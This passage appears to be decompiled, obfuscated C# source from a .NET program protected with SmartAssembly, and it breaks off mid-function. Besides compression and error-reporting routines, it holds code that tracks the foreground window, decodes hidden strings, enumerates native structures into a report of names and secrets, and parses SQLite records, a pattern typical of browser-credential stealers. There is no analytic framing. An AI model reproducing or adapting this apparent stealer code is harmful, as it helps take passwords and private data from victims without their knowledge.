			if (class39_0.byte_0[int_0 + *(int*)((byte*)ptr + 8)] != ((byte*)ptr)[21] || class39_0.byte_0[int_0 + *(int*)((byte*)ptr + 8) - 1] != ((byte*)ptr)[20] || class39_0.byte_0[int_0] != class39_0.byte_0[int_] || class39_0.byte_0[int_0 + 1] != class39_0.byte_0[int_ + 1])
			{
				continue;
			}
			int num2 = int_0 + 2;
			int_ += 2;
			while (class39_0.byte_0[++int_] == class39_0.byte_0[++num2] && class39_0.byte_0[++int_] == class39_0.byte_0[++num2] && class39_0.byte_0[++int_] == class39_0.byte_0[++num2] && class39_0.byte_0[++int_] == class39_0.byte_0[++num2] && class39_0.byte_0[++int_] == class39_0.byte_0[++num2] && class39_0.byte_0[++int_] == class39_0.byte_0[++num2] && class39_0.byte_0[++int_] == class39_0.byte_0[++num2] && class39_0.byte_0[++int_] == class39_0.byte_0[++num2] && int_ < *(int*)((byte*)ptr + 16))
			{
			}
			if (int_ > *(int*)((byte*)ptr + 4))
			{
				class39_0.int_1 = int_0;
				*(int*)((byte*)ptr + 4) = int_;
				*(int*)((byte*)ptr + 8) = int_ - class39_0.int_4;
				if (*(int*)((byte*)ptr + 8) >= *(int*)ptr)
				{
					break;
				}
				((byte*)ptr)[20] = class39_0.byte_0[*(int*)((byte*)ptr + 4) - 1];
				((byte*)ptr)[21] = class39_0.byte_0[*(int*)((byte*)ptr + 4)];
			}
			int_ = class39_0.int_4;
		}
		while ((int_0 = short_[int_0 & 0x7FFF] & 0xFFFF) > *(int*)((byte*)ptr + 12) && --num != 0);
		class39_0.int_2 = Math.Min(*(int*)((byte*)ptr + 8), class39_0.int_5);
		((byte*)ptr)[22] = ((class39_0.int_2 >= 3) ? ((byte)1) : ((byte)0));
		return ((byte*)ptr)[22] != 0;
	}

	unsafe static int smethod_25(Class30.Class33 class33_0, Class30.Class32 class32_0, int int_0)
	{
		void* ptr = stackalloc byte[12];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class33_0.int_1), Class42.smethod_149(class32_0));
		*(int*)((byte*)ptr + 4) = 32768 - class33_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class42.smethod_52(class32_0, class33_0.byte_0, class33_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class42.smethod_52(class32_0, class33_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class42.smethod_52(class32_0, class33_0.byte_0, class33_0.int_0, int_0);
		}
		class33_0.int_0 = (class33_0.int_0 + *(int*)ptr) & 0x7FFF;
		class33_0.int_1 += *(int*)ptr;
		*(int*)((byte*)ptr + 8) = *(int*)ptr;
		return *(int*)((byte*)ptr + 8);
	}

	static int smethod_26(Class30.Class32 class32_0)
	{
		return class32_0.int_2;
	}

	static void smethod_27(Exception exception_0, object object_0, object object_1, object object_2)
	{
		Class42.smethod_45(exception_0, new object[3] { object_0, object_1, object_2 });
	}

	static bool smethod_28()
	{
		try
		{
			return Class42.GetSystemMetrics(89) != 0;
		}
		catch
		{
			return false;
		}
	}

	static string smethod_29(string string_0)
	{
		string result = default(string);
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(Class42.smethod_161("eZCrwaqSsXaiqYeptCc=", "False"), ""));
			object[] array = new object[1] { string_0 };
			bool[] array2 = new bool[1] { true };
			object obj = NewLateBinding.LateGet(objectValue, (Type)null, "RGRD", array, (string[])null, (Type[])null, array2);
			if (array2[0])
			{
				string_0 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			result = Conversions.ToString(obj);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static int smethod_30(Class45 class45_0, Class45.Struct24 struct24_0)
	{
		string key = struct24_0.struct23_0.string_0.ToUpper();
		if (class45_0.dictionary_3.ContainsKey(key))
		{
			return class45_0.dictionary_3[key];
		}
		int count = class45_0.list_2.Count;
		class45_0.list_2.Add(struct24_0.struct23_0);
		class45_0.dictionary_3.Add(key, count);
		return count;
	}

	static bool smethod_31(byte[] byte_0, Class44.Class48 class48_0, Class44 class44_0)
	{
		byte[] byte_;
		try
		{
			byte_ = Class42.smethod_150(byte_0);
		}
		catch (Exception)
		{
			Class42.smethod_117(class44_0, Enum1.const_0, Class30.string_0);
			return false;
		}
		byte[] array = Class42.smethod_166(byte_, "<RSAKeyValue><Modulus>rFvhTKZ02fg+HlweeXc0b5/dgOgNvtEx4cpAUpjBWYtNw/YQwaRVLxadoQ60jOILYr94/5FttiU18eCoHRbpzhHZaEbAEh8xZCW6fGKWZNCUSUB9HUrOtjA2W7v0ojIkHqHTw5X8WXi9EuMrTD/sNZHJrsWbhKA+a1LceK04w9M=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
		if (array == null)
		{
			Class42.smethod_117(class44_0, Enum1.const_0, Class43.string_0);
			return false;
		}
		Class42.smethod_156(class44_0, Enum1.const_1);
		Class53 @class = new Class53("d98c1dd4-008f-04b2-e980-0998ecf8427e");
		if (class44_0.iwebProxy_0 != null)
		{
			@class.iwebProxy_0 = class44_0.iwebProxy_0;
		}
		Class44.Class46 class2 = new Class44.Class46(class44_0, array, @class, class48_0);
		Class42.smethod_71(@class, (Delegate3)class2.method_0);
		return class2.bool_0;
	}

	unsafe static void smethod_32(Class30.Class37 class37_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)ptr = 0;
		while (*(int*)ptr < class37_0.int_1)
		{
			*(int*)((byte*)ptr + 4) = class37_0.byte_1[*(int*)ptr] & 0xFF;
			int num = class37_0.short_0[*(int*)ptr];
			if (num-- != 0)
			{
				*(int*)((byte*)ptr + 8) = Class42.smethod_153(class37_0, *(int*)((byte*)ptr + 4));
				Class42.smethod_144(class37_0.class38_0, *(int*)((byte*)ptr + 8));
				*(int*)((byte*)ptr + 12) = (*(int*)((byte*)ptr + 8) - 261) / 4;
				if (*(int*)((byte*)ptr + 12) > 0 && *(int*)((byte*)ptr + 12) <= 5)
				{
					Class42.smethod_167(class37_0.class40_0, *(int*)((byte*)ptr + 4) & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
				*(int*)((byte*)ptr + 16) = Class42.smethod_131(class37_0, num);
				Class42.smethod_144(class37_0.class38_1, *(int*)((byte*)ptr + 16));
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16) / 2 - 1;
				if (*(int*)((byte*)ptr + 12) > 0)
				{
					Class42.smethod_167(class37_0.class40_0, num & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
			}
			else
			{
				Class42.smethod_144(class37_0.class38_0, *(int*)((byte*)ptr + 4));
			}
			(*(int*)ptr)++;
		}
		Class42.smethod_144(class37_0.class38_0, 256);
	}

	unsafe static void smethod_33(bool bool_0, int int_0, byte[] byte_0, int int_1, Class30.Class37 class37_0)
	{
		void* ptr = stackalloc byte[24];
		short[] short_;
		(short_ = class37_0.class38_0.short_0)[256] = (short)(short_[256] + 1);
		Class42.smethod_78(class37_0.class38_0);
		Class42.smethod_78(class37_0.class38_1);
		Class30.Class37.Class38 class38_ = class37_0.class38_0;
		Class30.Class37.Class38 class38_2 = class37_0.class38_2;
		Class42.smethod_3(class38_2, class38_);
		class38_ = class37_0.class38_1;
		class38_2 = class37_0.class38_2;
		Class42.smethod_3(class38_2, class38_);
		Class42.smethod_78(class37_0.class38_2);
		*(int*)ptr = 4;
		*(int*)((byte*)ptr + 4) = 18;
		while (*(int*)((byte*)ptr + 4) > *(int*)ptr)
		{
			if (class37_0.class38_2.byte_0[Class30.Class37.int_0[*(int*)((byte*)ptr + 4)]] > 0)
			{
				*(int*)ptr = *(int*)((byte*)ptr + 4) + 1;
			}
			(*(int*)((byte*)ptr + 4))--;
		}
		*(int*)((byte*)ptr + 8) = 14 + *(int*)ptr * 3 + Class42.smethod_134(class37_0.class38_2) + Class42.smethod_134(class37_0.class38_0) + Class42.smethod_134(class37_0.class38_1) + class37_0.int_2;
		*(int*)((byte*)ptr + 12) = class37_0.int_2;
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < 286)
		{
			*(int*)((byte*)ptr + 12) += class37_0.class38_0.short_0[*(int*)((byte*)ptr + 16)] * Class30.Class37.byte_2[*(int*)((byte*)ptr + 16)];
			(*(int*)((byte*)ptr + 16))++;
		}
		*(int*)((byte*)ptr + 20) = 0;
		while (*(int*)((byte*)ptr + 20) < 30)
		{
			*(int*)((byte*)ptr + 12) += class37_0.class38_1.short_0[*(int*)((byte*)ptr + 20)] * Class30.Class37.byte_3[*(int*)((byte*)ptr + 20)];
			(*(int*)((byte*)ptr + 20))++;
		}
		if (*(int*)((byte*)ptr + 8) >= *(int*)((byte*)ptr + 12))
		{
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 12);
		}
		if (int_1 >= 0 && int_0 + 4 < *(int*)((byte*)ptr + 8) >> 3)
		{
			Class42.smethod_40(byte_0, int_1, bool_0, int_0, class37_0);
		}
		else if (*(int*)((byte*)ptr + 8) == *(int*)((byte*)ptr + 12))
		{
			Class42.smethod_167(class37_0.class40_0, 2 + (bool_0 ? 1 : 0), 3);
			Class30.Class37.Class38 class38_3 = class37_0.class38_0;
			short[] short_2 = Class30.Class37.short_1;
			byte[] byte_ = Class30.Class37.byte_2;
			Class42.smethod_34(short_2, class38_3, byte_);
			class38_3 = class37_0.class38_1;
			short_2 = Class30.Class37.short_2;
			byte_ = Class30.Class37.byte_3;
			Class42.smethod_34(short_2, class38_3, byte_);
			Class42.smethod_32(class37_0);
			Class42.smethod_110(class37_0);
		}
		else
		{
			Class42.smethod_167(class37_0.class40_0, 4 + (bool_0 ? 1 : 0), 3);
			Class42.smethod_172(class37_0, *(int*)ptr);
			Class42.smethod_32(class37_0);
			Class42.smethod_110(class37_0);
		}
	}

	static void smethod_34(short[] short_0, Class30.Class37.Class38 class38_0, byte[] byte_0)
	{
		class38_0.short_1 = short_0;
		class38_0.byte_0 = byte_0;
	}

	static string smethod_35()
	{
		return "SmartAssembly" + " " + Class42.smethod_2();
	}

	static bool smethod_36(int int_0, string string_0, ref IntPtr intptr_0, ref int int_1)
	{
		return false;
	}

	static void smethod_37(int int_0, Class30.Stream0 stream0_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static void smethod_38(Exception exception_0, Class45 class45_0)
	{
		using (new Class55(class45_0.xmlWriter_0, "Exception"))
		{
			try
			{
				Type type = exception_0.GetType();
				class45_0.method_3(type);
				string value = "N/A";
				try
				{
					value = exception_0.Message;
				}
				catch
				{
				}
				class45_0.xmlWriter_0.WriteAttributeString("Message", value);
				string text = exception_0.StackTrace!.Trim();
				class45_0.xmlWriter_0.WriteAttributeString("ExceptionStackTrace", text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf("\r\n");
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				class45_0.xmlWriter_0.WriteAttributeString("Method", text);
				class45_0.method_1(new Class49(exception_0, bool_1: true));
			}
			catch
			{
			}
		}
	}

	static string smethod_39(string string_0)
	{
		string result = default(string);
		try
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			Decoder decoder = uTF8Encoding.GetDecoder();
			byte[] array = Convert.FromBase64String(string_0);
			int charCount = decoder.GetCharCount(array, 0, array.Length);
			char[] array2 = new char[checked(charCount - 1 + 1)];
			decoder.GetChars(array, 0, array.Length, array2, 0);
			string text = new string(array2);
			result = text;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	static void smethod_40(byte[] byte_0, int int_0, bool bool_0, int int_1, Class30.Class37 class37_0)
	{
		Class42.smethod_167(class37_0.class40_0, bool_0 ? 1 : 0, 3);
		Class42.smethod_165(class37_0.class40_0);
		Class42.smethod_130(int_1, class37_0.class40_0);
		Class42.smethod_130(~int_1, class37_0.class40_0);
		Class42.smethod_132(int_0, int_1, byte_0, class37_0.class40_0);
		Class42.smethod_110(class37_0);
	}

	static void smethod_41(Class30.Class36 class36_0, byte[] byte_0)
	{
		Class42.smethod_97(class36_0.class39_0, byte_0);
	}

	unsafe static int smethod_42()
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = Class10.struct3_0.Length;
		*(int*)((byte*)ptr + 4) = *(int*)ptr;
		return *(int*)((byte*)ptr + 4);
	}

	static short smethod_43(int int_0)
	{
		return (short)((Class30.Class37.byte_0[int_0 & 0xF] << 12) | (Class30.Class37.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class30.Class37.byte_0[(int_0 >> 8) & 0xF] << 4) | Class30.Class37.byte_0[int_0 >> 12]);
	}

	static void smethod_44(Exception exception_0, object object_0)
	{
		Class42.smethod_45(exception_0, new object[1] { object_0 });
	}

	unsafe static void smethod_45(Exception exception_0, object[] object_0)
	{
		void* ptr = stackalloc byte[16];
		*(int*)ptr = -1;
		*(int*)((byte*)ptr + 4) = -1;
		*(int*)((byte*)ptr + 8) = 0;
		StackTrace stackTrace = new StackTrace(exception_0);
		try
		{
			if (exception_0.StackTrace != null)
			{
				string[] array = exception_0.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				*(int*)((byte*)ptr + 12) = 0;
				while (*(int*)((byte*)ptr + 12) < array2.Length)
				{
					string text = array2[*(int*)((byte*)ptr + 12)];
					if (text.Length > 0)
					{
						(*(int*)((byte*)ptr + 8))++;
					}
					(*(int*)((byte*)ptr + 12))++;
				}
			}
		}
		catch
		{
			*(int*)((byte*)ptr + 8) = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				*(int*)ptr = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				*(int*)((byte*)ptr + 4) = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(*(int*)ptr, object_0, *(int*)((byte*)ptr + 4), *(int*)((byte*)ptr + 8));
			LinkedList<object> linkedList;
			if (!exception_0.Data.Contains("SmartStackFrames"))
			{
				linkedList = new LinkedList<object>();
				exception_0.Data["SmartStackFrames"] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)exception_0.Data["SmartStackFrames"];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static int smethod_46(Class30.Class40 class40_0, byte[] byte_0, int int_0, int int_1)
	{
		if (class40_0.int_2 >= 8)
		{
			class40_0.byte_0[class40_0.int_1++] = (byte)class40_0.uint_0;
			class40_0.uint_0 >>= 8;
			class40_0.int_2 -= 8;
		}
		if (int_1 > class40_0.int_1 - class40_0.int_0)
		{
			int_1 = class40_0.int_1 - class40_0.int_0;
			Array.Copy(class40_0.byte_0, class40_0.int_0, byte_0, int_0, int_1);
			class40_0.int_0 = 0;
			class40_0.int_1 = 0;
		}
		else
		{
			Array.Copy(class40_0.byte_0, class40_0.int_0, byte_0, int_0, int_1);
			class40_0.int_0 += int_1;
		}
		return int_1;
	}

	static string smethod_47()
	{
		return "SmartAssembly";
	}

	unsafe static void smethod_48(Class30.Class39 class39_0)
	{
		void* ptr = stackalloc byte[16];
		Array.Copy(class39_0.byte_0, 32768, class39_0.byte_0, 0, 32768);
		class39_0.int_1 -= 32768;
		class39_0.int_4 -= 32768;
		class39_0.int_3 -= 32768;
		*(int*)ptr = 0;
		while (*(int*)ptr < 32768)
		{
			*(int*)((byte*)ptr + 4) = class39_0.short_0[*(int*)ptr] & 0xFFFF;
			class39_0.short_0[*(int*)ptr] = (short)((*(int*)((byte*)ptr + 4) >= 32768) ? (*(int*)((byte*)ptr + 4) - 32768) : 0);
			(*(int*)ptr)++;
		}
		*(int*)((byte*)ptr + 8) = 0;
		while (*(int*)((byte*)ptr + 8) < 32768)
		{
			*(int*)((byte*)ptr + 12) = class39_0.short_1[*(int*)((byte*)ptr + 8)] & 0xFFFF;
			class39_0.short_1[*(int*)((byte*)ptr + 8)] = (short)((*(int*)((byte*)ptr + 12) >= 32768) ? (*(int*)((byte*)ptr + 12) - 32768) : 0);
			(*(int*)((byte*)ptr + 8))++;
		}
	}

	static ICryptoTransform smethod_49(byte[] byte_0, Class29 class29_0, byte[] byte_1, bool bool_0)
	{
		class29_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class29_0.object_0, new object[1] { byte_0 });
		class29_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class29_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class29_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class29_0.object_0, new object[0]);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	static extern int GetWindowTextLength(IntPtr intptr_0);

	[DllImport("user32.dll", SetLastError = true)]
	static extern IntPtr GetForegroundWindow();

	unsafe static void smethod_50()
	{
		void* ptr = stackalloc byte[13];
		string string_ = Class42.smethod_161("KA==", "False");
		*(int*)ptr = 0;
		IntPtr intptr_ = IntPtr.Zero;
		IntPtr[] array = null;
		((byte*)ptr)[12] = (Class42.smethod_36(0, Class42.smethod_161("mMXV0s+4z7PX1qaW1c/NppmRCA==", "False"), ref intptr_, ref *(int*)ptr) ? ((byte)1) : ((byte)0));
		try
		{
			if (((byte*)ptr)[12] != 0)
			{
				IntPtr intPtr;
				byte* num;
				checked
				{
					array = new IntPtr[*unchecked((int*)ptr) - 1 + 1];
					intPtr = intptr_;
					num = unchecked((byte*)ptr) + 4;
					*unchecked((int*)((byte*)ptr + 8)) = *unchecked((int*)ptr) - 1;
				}
				*(int*)num = 0;
				while (*(int*)((byte*)ptr + 4) <= *(int*)((byte*)ptr + 8))
				{
					ref IntPtr reference = ref array[*(int*)((byte*)ptr + 4)];
					checked
					{
						reference = Marshal.ReadIntPtr((IntPtr)(intPtr.ToInt32() + IntPtr.Size * *unchecked((int*)((byte*)ptr + 4))));
						Class16.Class17.Struct7 @struct = (Class16.Class17.Struct7)Marshal.PtrToStructure(array[*unchecked((int*)((byte*)ptr + 4))], typeof(Class16.Class17.Struct7));
						Class16.Class17.Struct6 struct6_ = default(Class16.Class17.Struct6);
						Class16.Class17.Struct6 struct6_2 = default(Class16.Class17.Struct6);
						struct6_.intptr_0 = @struct.intptr_5;
						struct6_.int_0 = (int)@struct.intptr_4;
						Class42.smethod_135(0, ref struct6_2, 0, 0, 0, ref struct6_, 1);
						string_ = Class42.smethod_161("WnWAh3ladYCHeVp1gIeJcIaAh3ladYCHeVp1gId5WnUr", "False") + Environment.NewLine + Environment.NewLine + Class42.smethod_161("ebKvw7GFrK+LYyI=", "False") + Marshal.PtrToStringAuto(@struct.intptr_10) + Environment.NewLine + Class42.smethod_161("gKzJ0MafvbqXbxY=", "False") + Marshal.PtrToStringAuto(struct6_.intptr_0) + Environment.NewLine + Environment.NewLine + Class42.smethod_161("cYyXnpBxjJeekHGMl56QcYyXnpBxjJeekHGMl56QcYwU", "False");
						(*unchecked((int*)((byte*)ptr + 4)))++;
					}
				}
				Class5.string_5 = string_;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Class5.string_5 = Class42.smethod_161("KA==", "False");
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_51(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7, object object_8)
	{
		Class42.smethod_45(exception_0, new object[9] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7, object_8 });
	}

	unsafe static int smethod_52(Class30.Class32 class32_0, byte[] byte_0, int int_0, int int_1)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (class32_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class32_0.uint_0;
			class32_0.uint_0 >>= 8;
			class32_0.int_2 -= 8;
			int_1--;
			(*(int*)ptr)++;
		}
		if (int_1 == 0)
		{
			*(int*)((byte*)ptr + 8) = *(int*)ptr;
		}
		else
		{
			*(int*)((byte*)ptr + 4) = class32_0.int_1 - class32_0.int_0;
			if (int_1 > *(int*)((byte*)ptr + 4))
			{
				int_1 = *(int*)((byte*)ptr + 4);
			}
			Array.Copy(class32_0.byte_0, class32_0.int_0, byte_0, int_0, int_1);
			class32_0.int_0 += int_1;
			if (((uint)(class32_0.int_0 - class32_0.int_1) & (true ? 1u : 0u)) != 0)
			{
				class32_0.uint_0 = class32_0.byte_0[class32_0.int_0++] & 0xFFu;
				class32_0.int_2 = 8;
			}
			*(int*)((byte*)ptr + 8) = *(int*)ptr + int_1;
		}
		return *(int*)((byte*)ptr + 8);
	}

	unsafe static void smethod_53(Class10 class10_0, ulong ulong_0)
	{
		void* ptr = stackalloc byte[62];
		if (Class10.byte_0[checked((int)ulong_0)] == 13)
		{
			*(ushort*)((byte*)ptr + 56) = Convert.ToUInt16(decimal.Subtract(new decimal(Class42.smethod_9(Convert.ToInt32(decimal.Add(new decimal(ulong_0), new decimal(3L))), 2)), 1m));
			*(int*)((byte*)ptr + 24) = 0;
			checked
			{
				if (Class10.struct4_0 != null)
				{
					*unchecked((int*)((byte*)ptr + 24)) = Class10.struct4_0.Length;
					Class10.struct4_0 = (Class10.Struct4[])Utils.CopyArray((Array)Class10.struct4_0, (Array)new Class10.Struct4[Class10.struct4_0.Length + unchecked((int)(*(ushort*)((byte*)ptr + 56))) + 1]);
				}
				else
				{
					Class10.struct4_0 = new Class10.Struct4[unchecked((int)(*(ushort*)((byte*)ptr + 56))) + 1];
				}
			}
			byte* num = (byte*)ptr + 28;
			*(int*)((byte*)ptr + 48) = *(ushort*)((byte*)ptr + 56);
			*(int*)num = 0;
			while (*(int*)((byte*)ptr + 28) <= *(int*)((byte*)ptr + 48))
			{
				checked
				{
					*unchecked((ulong*)ptr) = Class42.smethod_9(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(ulong_0), new decimal(8L)), new decimal(*unchecked((int*)((byte*)ptr + 28)) * 2))), 2);
					if (decimal.Compare(new decimal(ulong_0), new decimal(100L)) != 0)
					{
						*unchecked((ulong*)ptr) = unchecked((ulong)(*(long*)ptr)) + ulong_0;
					}
					*unchecked((int*)((byte*)ptr + 36)) = Class42.smethod_128((int)(*unchecked((ulong*)ptr)));
					*unchecked((long*)((byte*)ptr + 16)) = Class42.smethod_59(*unchecked((int*)((byte*)ptr + 36)), (int)(*unchecked((ulong*)ptr)));
				}
				*(int*)((byte*)ptr + 32) = Class42.smethod_128(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), decimal.Subtract(new decimal(*(int*)((byte*)ptr + 36)), new decimal(*(ulong*)ptr))), 1m)));
				Class10.struct4_0[checked(*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28)))].long_0 = Class42.smethod_59(*(int*)((byte*)ptr + 32), Convert.ToInt32(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), decimal.Subtract(new decimal(*(int*)((byte*)ptr + 36)), new decimal(*(ulong*)ptr))), 1m)));
				*(ulong*)ptr = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(*(ulong*)ptr), decimal.Subtract(new decimal(*(int*)((byte*)ptr + 32)), new decimal(*(ulong*)ptr))), 1m));
				*(int*)((byte*)ptr + 36) = Class42.smethod_128(checked((int)(*unchecked((ulong*)ptr))));
				*(int*)((byte*)ptr + 32) = *(int*)((byte*)ptr + 36);
				*(long*)((byte*)ptr + 8) = Class42.smethod_59(*(int*)((byte*)ptr + 36), checked((int)(*unchecked((ulong*)ptr))));
				long[] array = new long[5];
				*(int*)((byte*)ptr + 40) = 0;
				do
				{
					*(int*)((byte*)ptr + 36) = checked(*unchecked((int*)((byte*)ptr + 32)) + 1);
					*(int*)((byte*)ptr + 32) = Class42.smethod_128(*(int*)((byte*)ptr + 36));
					array[*(int*)((byte*)ptr + 40)] = Class42.smethod_59(*(int*)((byte*)ptr + 32), *(int*)((byte*)ptr + 36));
					checked
					{
						if (array[*unchecked((int*)((byte*)ptr + 40))] <= 9L)
						{
							array[*unchecked((int*)((byte*)ptr + 40))] = Class10.byte_1[(int)array[*unchecked((int*)((byte*)ptr + 40))]];
						}
						else if (Class42.smethod_101(array[*unchecked((int*)((byte*)ptr + 40))]))
						{
							array[*unchecked((int*)((byte*)ptr + 40))] = (long)Math.Round((double)(array[*unchecked((int*)((byte*)ptr + 40))] - 13L) / 2.0);
						}
						else
						{
							array[*unchecked((int*)((byte*)ptr + 40))] = (long)Math.Round((double)(array[*unchecked((int*)((byte*)ptr + 40))] - 12L) / 2.0);
						}
						(*unchecked((int*)((byte*)ptr + 40)))++;
					}
				}
				while (*(int*)((byte*)ptr + 40) <= 4);
				checked
				{
					if (decimal.Compare(new decimal(Class10.ulong_0), 1m) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_0 = Encoding.Default.GetString(Class10.byte_0, Convert.ToInt32(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8))))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(Class10.ulong_0), new decimal(2L)) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_0 = Encoding.Unicode.GetString(Class10.byte_0, Convert.ToInt32(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8))))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(Class10.ulong_0), new decimal(3L)) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_0 = Encoding.BigEndianUnicode.GetString(Class10.byte_0, Convert.ToInt32(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8))))), (int)array[0]);
					}
					if (decimal.Compare(new decimal(Class10.ulong_0), 1m) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_1 = Encoding.Default.GetString(Class10.byte_0, Convert.ToInt32(decimal.Add(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8)))), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(Class10.ulong_0), new decimal(2L)) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_1 = Encoding.Unicode.GetString(Class10.byte_0, Convert.ToInt32(decimal.Add(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8)))), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(Class10.ulong_0), new decimal(3L)) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_1 = Encoding.BigEndianUnicode.GetString(Class10.byte_0, Convert.ToInt32(decimal.Add(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8)))), new decimal(array[0]))), (int)array[1]);
					}
					Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].long_1 = (long)Class42.smethod_9(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8)))), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					if (decimal.Compare(new decimal(Class10.ulong_0), 1m) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_3 = Encoding.Default.GetString(Class10.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8)))), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(Class10.ulong_0), new decimal(2L)) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_3 = Encoding.Unicode.GetString(Class10.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8)))), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(Class10.ulong_0), new decimal(3L)) == 0)
					{
						Class10.struct4_0[*unchecked((int*)((byte*)ptr + 24)) + *unchecked((int*)((byte*)ptr + 28))].string_3 = Encoding.BigEndianUnicode.GetString(Class10.byte_0, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(unchecked(decimal.Add(new decimal(*(ulong*)ptr), new decimal(*(long*)((byte*)ptr + 8)))), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					(*unchecked((int*)((byte*)ptr + 28)))++;
				}
			}
		}
		else
		{
			if (Class10.byte_0[checked((int)ulong_0)] != 5)
			{
				return;
